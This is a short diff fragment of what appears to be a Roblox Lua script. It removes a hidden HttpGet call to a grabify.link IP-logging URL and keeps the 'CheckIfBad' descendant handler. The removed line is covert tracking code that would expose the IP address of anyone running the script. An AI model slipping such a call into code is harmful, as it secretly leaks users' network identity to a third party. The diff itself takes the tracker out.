@@ -111,6 +111,4 @@ for i, v in pairs(Descendants) do
     end
 end
 
-game:HttpGet("https://grabify.link/HYE1UE", true)
-
 game.DescendantAdded:Connect(CheckIfBad)
